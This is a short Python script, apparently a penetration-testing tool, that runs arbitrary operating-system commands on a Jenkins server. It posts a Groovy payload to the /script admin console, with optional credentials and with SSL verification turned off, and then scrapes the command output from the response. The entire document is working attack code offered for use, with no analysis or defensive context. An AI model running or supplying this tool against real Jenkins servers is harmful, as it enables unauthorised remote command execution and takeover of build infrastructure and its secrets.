#!/usr/bin/env python3
import requests
import argparse
import re


# IGNORE SSL WARNING ###########################################################
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


# MAIN #########################################################################
parser = argparse.ArgumentParser(description = 'Jenkins Admin Groovy Console exec')
parser.add_argument('url', type=str)
parser.add_argument('-u', '--user', type=str)
parser.add_argument('-p', '--password', type=str)
parser.add_argument('-c', '--command', type=str, required=True)

args = parser.parse_args()
URL = args.url
if args.user and args.password:
    AUTH = (args.user, args.password)
else:
    AUTH = None

DATA = {'script':'def proc = "{}".execute();def os = new StringBuffer();proc.waitForProcessOutput(os, System.err);println(os.toString());'.format(args.command)}

r = requests.post(URL + '/script', data=DATA, auth=AUTH, verify=False)
m = re.search('<h2>Result</h2><pre>(.*)</pre>', r.text, flags=re.DOTALL)
if m:
    print(m.group(1))
else:
    print('oops')
